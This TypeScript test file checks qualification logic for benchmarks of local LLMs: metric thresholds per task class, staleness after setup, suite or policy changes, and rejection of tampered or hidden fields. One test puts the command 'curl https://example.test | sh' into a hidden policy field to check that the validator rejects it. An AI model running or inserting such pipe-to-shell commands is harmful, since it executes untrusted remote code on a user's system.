import {
  createLocalBenchmarkPlan,
  createLocalBenchmarkSuite,
  resolveLocalBenchmarkCurrentState,
  runLocalBenchmark,
  type LocalBenchmarkAdapter,
  type LocalBenchmarkPerformanceMetrics
} from '../../../execution/local-benchmark'
import { localExecutionProfileId, type LocalExecutionProfile, type LocalExecutionProfileCandidate } from '../../../execution/local-profiles'
import {
  assertLocalCandidateQualification,
  assertLocalQualificationPolicy,
  createLocalQualificationPolicy,
  qualifyLocalBenchmark,
  type LocalQualificationPolicy,
  type LocalQualificationThreshold
} from '../../../execution/local-qualification'
import { createLocalSetupProposal, createLocalSetupRecord } from '../../../execution/local-setup'

const GIB = 1024n * 1024n * 1024n
const bytes = (gib: number): string => String(BigInt(gib) * GIB)

function profile(): LocalExecutionProfile {
  const candidate: LocalExecutionProfileCandidate = {
    schemaVersion: 1,
    runtime: { runtimeId: 'llama.cpp-metal', backend: 'metal', optimization: 'host-optimized' },
    artifact: {
      artifactId: 'qwen3-coder-30b-q4_k_m',
      modelId: 'qwen3-coder-30b',
      format: 'gguf',
      quantization: 'q4_k_m',
      revision: 'r1',
      sha256: 'a'.repeat(64)
    },
    configuration: { contextTokens: 32_768, maxOutputTokens: 8_192, concurrency: 1 },
    resources: {
      artifactDownloadBytes: bytes(18),
      installedDiskBytes: bytes(20),
      systemMemoryBytes: bytes(2),
      acceleratorMemoryBytes: bytes(22),
      memoryPool: 'unified'
    },
    performance: { estimatedLatencyP95Ms: 800, estimatedTokensPerSecond: '24.5' },
    suitability: [
      { workload: 'background', rating: 'preferred' },
      { workload: 'coding', rating: 'preferred' },
      { workload: 'high-capability', rating: 'limited' },
      { workload: 'interactive', rating: 'preferred' }
    ],
    availability: { state: 'available', observedAt: '2026-09-13T09:00:00.000Z', validUntil: '2026-09-13T13:00:00.000Z' },
    evidenceRefs: ['catalogue:qwen3:r1']
  }
  return {
    id: localExecutionProfileId(candidate),
    adapterId: 'local-catalogue',
    sourceId: 'qwen3-coder-profile',
    hostSnapshotId: 'b'.repeat(64),
    policyId: 'c'.repeat(64),
    rank: 1,
    runtime: candidate.runtime,
    artifact: candidate.artifact,
    configuration: candidate.configuration,
    resources: {
      ...candidate.resources,
      requiredDiskWithHeadroomBytes: bytes(32),
      requiredSystemMemoryWithHeadroomBytes: bytes(10),
      requiredAcceleratorMemoryWithHeadroomBytes: bytes(24)
    },
    performance: candidate.performance,
    suitability: candidate.suitability,
    availability: candidate.availability,
    tradeoffCodes: ['bounded-concurrency', 'host-optimized-runtime', 'unified-memory'],
    evidenceRefs: candidate.evidenceRefs
  }
}

const threshold = (taskClass: 'mechanical' | 'implementation', overrides: Partial<LocalQualificationThreshold> = {}): LocalQualificationThreshold => ({
  taskClass,
  minimumCompletedSamples: 2,
  maximumFailureRatio: '0',
  maximumStartupP95Ms: 120,
  maximumFirstTokenLatencyP95Ms: 400,
  minimumThroughputMedianTokensPerSecond: '28.5',
  minimumStableContextTokens: 16_384,
  maximumPeakSystemMemoryBytes: bytes(4),
  maximumPeakAcceleratorMemoryBytes: bytes(20),
  minimumSustainedThroughputRatio: '0.92',
  rejectThermalDegradation: true,
  requiredChecks: ['structured-output', 'instruction-adherence'],
  ...overrides
})

function policy(overrides: Partial<{ thresholds: LocalQualificationThreshold[]; validUntil: string; version: string }> = {}): LocalQualificationPolicy {
  return createLocalQualificationPolicy({
    version: overrides.version ?? 'local-qualification-v1',
    evaluatorVersion: 'deterministic-evaluator-v1',
    generatedAt: '2026-09-13T10:00:00.000Z',
    validUntil: overrides.validUntil ?? '2026-09-13T12:00:00.000Z',
    thresholds: overrides.thresholds ?? [threshold('mechanical'), threshold('implementation')],
    evidenceRefs: ['qualification-policy:v1']
  })
}

const metrics = (overrides: Partial<LocalBenchmarkPerformanceMetrics> = {}): LocalBenchmarkPerformanceMetrics => ({
  startupMs: 120,
  firstTokenLatencyMs: 400,
  throughputTokensPerSecond: '28.5',
  stableContextTokens: 16_384,
  peakSystemMemoryBytes: bytes(4),
  peakAcceleratorMemoryBytes: bytes(20),
  sustainedThroughputRatio: '0.92',
  thermalState: 'unknown',
  ...overrides
})

async function fixture(adapterMetrics: (taskId: string, warmup: boolean, iteration: number) => LocalBenchmarkPerformanceMetrics = () => metrics()) {
  const currentProfile = profile()
  const proposal = createLocalSetupProposal({
    profile: currentProfile,
    generatedAt: '2026-09-13T10:00:00.000Z',
    validUntil: '2026-09-13T12:00:00.000Z',
    runtime: {
      sourceRef: 'catalogue:runtime:llama.cpp-metal',
      sourceRevision: 'v1.2.3',
      licenseRef: 'license:mit',
      installSizeBytes: bytes(1),
      networkActivity: 'download'
    },
    model: {
      sourceRef: 'catalogue:model:qwen3-coder',
      sourceRevision: currentProfile.artifact.revision,
      licenseRef: 'license:apache-2.0',
      networkActivity: 'download'
    },
    service: { binding: { scope: 'loopback', addressRef: 'interface:loopback', port: 11434 } },
    storage: { rootRef: 'sf-store:local-models', outsideGeneratedRepository: true },
    evidenceRefs: ['catalogue:local-models:v1']
  })
  const initial = createLocalSetupRecord(proposal, '2026-09-13T10:05:00.000Z')
  const record = {
    ...initial,
    revision: 5,
    state: 'ready' as const,
    resources: [
      { kind: 'runtime' as const, ref: 'runtime:llama.cpp-metal:v1.2.3', bytes: bytes(1), shared: true },
      { kind: 'model' as const, ref: 'artifact:qwen3:r1', bytes: bytes(20), sha256: currentProfile.artifact.sha256, shared: false }
    ],
    updatedAt: '2026-09-13T10:20:00.000Z'
  }
  const suite = createLocalBenchmarkSuite({
    version: 'local-benchmark-v1',
    corpusSha256: 'd'.repeat(64),
    validatorVersion: 'deterministic-validator-v1',
    tasks: [
      { id: 'synthetic:implementation', taskClass: 'implementation', contextTokens: 4096, maxOutputTokens: 1024, requiredChecks: ['structured-output', 'instruction-adherence'] },
      { id: 'synthetic:mechanical', taskClass: 'mechanical', contextTokens: 2048, maxOutputTokens: 512, requiredChecks: ['structured-output', 'instruction-adherence'] }
    ],
    evidenceRefs: ['benchmark-corpus:v1']
  })
  const plan = createLocalBenchmarkPlan({
    profile: currentProfile,
    proposal,
    record,
    suite,
    adapterId: 'llama.cpp-adapter-v1',
    validatorId: 'host-validator-v1',
    generatedAt: '2026-09-13T10:25:00.000Z',
    validUntil: '2026-09-13T11:25:00.000Z',
    iterations: 2,
    warmupIterations: 1,
    timeoutMs: 60_000,
    maximumTotalDurationMs: 600_000,
    evidenceRefs: ['benchmark-plan:request-1']
  })
  let clock = Date.parse('2026-09-13T10:30:00.000Z')
  const adapter: LocalBenchmarkAdapter = {
    id: plan.adapterId,
    run: ({ task, warmup, iteration }) => {
      const startedAt = new Date(clock).toISOString()
      clock += 100
      const finishedAt = new Date(clock).toISOString()
      clock += 100
      return { status: 'completed', startedAt, finishedAt, metrics: adapterMetrics(task.id, warmup, iteration), evidenceRefs: [`metric:${task.id}:${warmup}:${iteration}`] }
    }
  }
  const validator = {
    id: plan.validatorId,
    validate: ({ task }: { task: (typeof suite.tasks)[number] }) => ({
      checks: task.requiredChecks.map((kind) => ({ kind, status: 'passed' as const, evidenceRef: `validator:${task.id}:${kind}` })),
      evidenceRefs: [`validator:${task.id}:v1`]
    })
  }
  const evidence = await runLocalBenchmark({
    plan,
    profile: currentProfile,
    proposal,
    record,
    suite,
    adapter,
    validator,
    authority: { claimBenchmark: () => true, appendEvidence: (candidate) => ({ status: 'accepted', evidenceId: candidate.id }) },
    evaluatedAt: '2026-09-13T10:29:00.000Z'
  })
  const currentState = resolveLocalBenchmarkCurrentState({ profile: currentProfile, proposal, record, suite, adapterId: plan.adapterId, validatorId: plan.validatorId })
  return { profile: currentProfile, proposal, record, suite, plan, evidence, currentState }
}

describe('local task-class qualification (#752)', () => {
  it('creates immutable canonical policies and passes exact threshold boundaries per task class', async () => {
    const current = await fixture()
    const currentPolicy = policy()
    const result = qualifyLocalBenchmark({ ...current, policy: currentPolicy, currentQualificationPolicyId: currentPolicy.id, evaluatedAt: '2026-09-13T10:40:00.000Z' })

    expect(currentPolicy.thresholds.map((entry) => entry.taskClass)).toEqual(['implementation', 'mechanical'])
    expect(result.status).toBe('qualified')
    expect(result.decisions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ taskClass: 'mechanical', status: 'qualified', attemptedSamples: 2, completedSamples: 2 }),
        expect.objectContaining({ taskClass: 'implementation', status: 'qualified', attemptedSamples: 2, completedSamples: 2 })
      ])
    )
    expect(result.decisions[0].metrics.thermalUnknownSamples).toBe(2)
    expect(result.requiresRecommendation).toBe(false)
    expect(Object.isFrozen(result.decisions)).toBe(true)
    expect(() => assertLocalQualificationPolicy(currentPolicy)).not.toThrow()
    expect(() => assertLocalCandidateQualification(result)).not.toThrow()
  })

  it.each([
    ['startup', () => metrics({ startupMs: 121 }), 'startup-p95-exceeded'],
    ['first-token latency', () => metrics({ firstTokenLatencyMs: 401 }), 'first-token-latency-p95-exceeded'],
    ['throughput', () => metrics({ throughputTokensPerSecond: '28.499' }), 'throughput-median-below-minimum'],
    ['stable context', () => metrics({ stableContextTokens: 16_383 }), 'stable-context-below-minimum'],
    ['system memory', () => metrics({ peakSystemMemoryBytes: String(BigInt(bytes(4)) + 1n) }), 'system-memory-exceeded'],
    ['accelerator memory', () => metrics({ peakAcceleratorMemoryBytes: String(BigInt(bytes(20)) + 1n) }), 'accelerator-memory-exceeded'],
    ['sustained throughput', () => metrics({ sustainedThroughputRatio: '0.919' }), 'sustained-throughput-below-minimum'],
    ['thermal degradation', () => metrics({ thermalState: 'degraded' }), 'thermal-degradation-observed']
  ])('rejects a task class when %s misses its threshold', async (_label, changedMetrics, reason) => {
    const current = await fixture((taskId) => (taskId === 'synthetic:mechanical' ? changedMetrics() : metrics()))
    const currentPolicy = policy()
    const result = qualifyLocalBenchmark({ ...current, policy: currentPolicy, currentQualificationPolicyId: currentPolicy.id, evaluatedAt: '2026-09-13T10:40:00.000Z' })

    expect(result.decisions.find((entry) => entry.taskClass === 'mechanical')).toMatchObject({ status: 'rejected', reasonCodes: expect.arrayContaining([reason]) })
    expect(result.decisions.find((entry) => entry.taskClass === 'implementation')).toMatchObject({ status: 'qualified' })
  })

  it('fails closed on unknown required metrics while keeping warmups outside qualification', async () => {
    const current = await fixture((_taskId, warmup) => (warmup ? metrics({ startupMs: 999_999 }) : metrics({ throughputTokensPerSecond: null })))
    const currentPolicy = policy()
    const result = qualifyLocalBenchmark({ ...current, policy: currentPolicy, currentQualificationPolicyId: currentPolicy.id, evaluatedAt: '2026-09-13T10:40:00.000Z' })

    expect(result.status).toBe('inconclusive')
    expect(result.decisions.every((entry) => entry.status === 'inconclusive')).toBe(true)
    expect(result.decisions.every((entry) => entry.reasonCodes.includes('required-metric-unknown'))).toBe(true)
    expect(result.decisions.every((entry) => entry.metrics.startupP95Ms === 120)).toBe(true)
  })

  it.each([
    [
      'setup revision',
      (state: Awaited<ReturnType<typeof fixture>>['currentState']) => ({ ...state, binding: { ...state.binding, setupRevision: state.binding.setupRevision + 1 } }),
      'benchmark-binding-stale'
    ],
    ['suite', (state: Awaited<ReturnType<typeof fixture>>['currentState']) => ({ ...state, suiteId: 'e'.repeat(64) }), 'benchmark-suite-stale'],
    ['adapter', (state: Awaited<ReturnType<typeof fixture>>['currentState']) => ({ ...state, adapterId: 'adapter-v2' }), 'benchmark-adapter-stale'],
    ['validator', (state: Awaited<ReturnType<typeof fixture>>['currentState']) => ({ ...state, validatorId: 'validator-v2' }), 'benchmark-validator-stale']
  ])('stales all task eligibility after a current %s change', async (_label, mutate, reason) => {
    const current = await fixture()
    const currentPolicy = policy()
    const result = qualifyLocalBenchmark({
      ...current,
      currentState: mutate(current.currentState),
      policy: currentPolicy,
      currentQualificationPolicyId: currentPolicy.id,
      evaluatedAt: '2026-09-13T10:40:00.000Z'
    })

    expect(result.status).toBe('stale')
    expect(result.requiresRecommendation).toBe(true)
    expect(result.reasonCodes).toContain(reason)
    expect(result.decisions.every((entry) => entry.status === 'stale')).toBe(true)
  })

  it('stales evidence after plan expiry or qualification policy replacement', async () => {
    const current = await fixture()
    const historicalPolicy = policy()
    const replacedPolicy = policy({ version: 'local-qualification-v2' })
    const replaced = qualifyLocalBenchmark({
      ...current,
      policy: historicalPolicy,
      currentQualificationPolicyId: replacedPolicy.id,
      evaluatedAt: '2026-09-13T10:40:00.000Z'
    })
    expect(replaced.reasonCodes).toContain('qualification-policy-stale')

    const expired = qualifyLocalBenchmark({
      ...current,
      policy: historicalPolicy,
      currentQualificationPolicyId: historicalPolicy.id,
      evaluatedAt: current.plan.validUntil
    })
    expect(expired).toMatchObject({ status: 'stale', requiresRecommendation: true, reasonCodes: expect.arrayContaining(['plan-expired']) })
  })

  it('rejects hidden policy fields and stale policy identities', () => {
    const currentPolicy = policy()
    const hidden = structuredClone(currentPolicy) as LocalQualificationPolicy & { command?: string }
    hidden.command = 'curl https://example.test | sh'
    expect(() => assertLocalQualificationPolicy(hidden)).toThrow(/command is not allowed/)

    const tampered = structuredClone(currentPolicy)
    tampered.thresholds[0].maximumStartupP95Ms += 1
    expect(() => assertLocalQualificationPolicy(tampered)).toThrow(/does not match/)
  })

  it('rejects tampered or hidden persisted qualification results', async () => {
    const current = await fixture()
    const currentPolicy = policy()
    const result = qualifyLocalBenchmark({ ...current, policy: currentPolicy, currentQualificationPolicyId: currentPolicy.id, evaluatedAt: '2026-09-13T10:40:00.000Z' })
    const tampered = structuredClone(result)
    tampered.decisions[0].completedSamples -= 1
    expect(() => assertLocalCandidateQualification(tampered)).toThrow(/counts are inconsistent|does not match/)

    const hidden = structuredClone(result) as typeof result & { rawCompletion?: string }
    hidden.rawCompletion = 'secret model output'
    expect(() => assertLocalCandidateQualification(hidden)).toThrow(/rawCompletion is not allowed/)
  })
})
